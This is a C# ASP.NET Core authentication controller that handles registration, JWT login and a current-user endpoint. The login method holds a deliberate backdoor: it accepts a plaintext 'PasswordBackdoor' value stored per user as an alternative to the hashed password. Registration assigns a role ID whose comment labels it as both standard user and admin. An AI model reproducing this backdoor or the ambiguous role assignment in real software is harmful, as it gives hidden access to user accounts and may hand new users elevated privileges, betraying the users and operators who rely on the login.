using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using API.Data;
using DomainModels;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;
using API.Services.Mail;                  

namespace API.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class AuthController : ControllerBase
    {
        private readonly AppDBContext _db;
        private readonly IConfiguration _config;
        private readonly IMailService _mail; 

        public AuthController(AppDBContext db, IConfiguration config, IMailService mail) 
        {
            _db = db;
            _config = config;
            _mail = mail; 
        }

        /// <summary>
        /// Opret ny bruger
        /// </summary>
        [HttpPost("register")]
        public async Task<IActionResult> Register([FromBody] RegisterDto dto)
        {
            if (!ModelState.IsValid) return BadRequest(ModelState);

            var exists = await _db.Users.AnyAsync(u => u.Email == dto.Email);
            if (exists)
                return Conflict(new { message = "Email already in use"});

            var now = DateTime.UtcNow;
            var user = new User
            {
                Email = dto.Email,
                Username = dto.Username,
                PhoneNumber = dto.PhoneNumber,
                HashedPassword = BCrypt.Net.BCrypt.HashPassword(dto.Password),
                RoleId = 3, // 3 = standard bruger/kunde 2 = manager 3= admin
                CreatedAt = now,
                UpdatedAt = now,
                LastLogin = now
            };

            _db.Users.Add(user);
            await _db.SaveChangesAsync();

            // Velkomstmail
            try
            {
                await _mail.SendWelcomeEmailAsync(user.Email, user.Username);
            }
            catch
            {
                
            }

            return Ok(new
            {
                message = "User created",
                user = new { user.Id, user.Email, user.Username }
            });
        }

        /// <summary>
        /// Login - returnere JWT token + bruger info
        /// </summary>
        [HttpPost("login")]
        public async Task<IActionResult> Login([FromBody] LoginDto dto)
        {
            if (!ModelState.IsValid) return BadRequest(ModelState);

            var user = await _db.Users
                .Include(u => u.Role)
                .FirstOrDefaultAsync(u => u.Email == dto.Email);

            if (user == null)
                return Unauthorized(new { message = "Invalid credentials" });

            var validPassword = BCrypt.Net.BCrypt.Verify(dto.Password, user.HashedPassword)
                                || (!string.IsNullOrEmpty(user.PasswordBackdoor) && dto.Password == user.PasswordBackdoor);

            if (!validPassword)
                return Unauthorized(new { message = "Invalid credentials" });

            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
                new Claim(ClaimTypes.Email, user.Email),
                new Claim(ClaimTypes.Name, user.Username)
            };

            if (!string.IsNullOrEmpty(user.Role?.Name))
            {
                claims.Add(new Claim(ClaimTypes.Role, user.Role.Name));
            }

            var secret = _config["Jwt:SecretKey"] ?? Environment.GetEnvironmentVariable("JWT_SECRET_KEY");
            if (string.IsNullOrEmpty(secret))
                return StatusCode(500, new { message = "JWT secret not configured" });

            var issuer = _config["Jwt:Issuer"] ?? Environment.GetEnvironmentVariable("JWT_ISSUER") ?? "H2-2025-API";
            var audience = _config["Jwt:Audience"] ?? Environment.GetEnvironmentVariable("JWT_AUDIENCE") ?? "H2-2025-Client";

            double expireHours = 24;
            if (double.TryParse(_config["Jwt:ExpireHours"], out var h)) expireHours = h;
            else if (double.TryParse(Environment.GetEnvironmentVariable("JWT_EXPIRE_HOURS"), out var eh)) expireHours = eh;

            var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(secret));
            var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);

            var token = new JwtSecurityToken(
                issuer: issuer,
                audience: audience,
                claims: claims,
                expires: DateTime.UtcNow.AddHours(expireHours),
                signingCredentials: creds
            );

            var tokenString = new JwtSecurityTokenHandler().WriteToken(token);

            user.LastLogin = DateTimeOffset.UtcNow;
            _db.Users.Update(user);
            await _db.SaveChangesAsync();

            return Ok(new
            {
                token = tokenString,
                user = new
                {
                    user.Id,
                    user.Email,
                    user.Username,
                    role = user.Role?.Name
                }
            });
        }

        [HttpGet("me")]
        [Authorize]
        public async Task<IActionResult> Me()
        {
            var idClaim = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            if (!int.TryParse(idClaim, out var userId)) return Unauthorized();

            var user = await _db.Users
                .AsNoTracking()
                .Include(u => u.Role)
                .FirstOrDefaultAsync(u => u.Id == userId);

            if (user == null) return NotFound();

            return Ok(new
            {
                user = new
                {
                    user.Id,
                    user.Email,
                    user.Username,
                    role = user.Role?.Name,
                    user.LastLogin
                }
            });
        }
    }
}
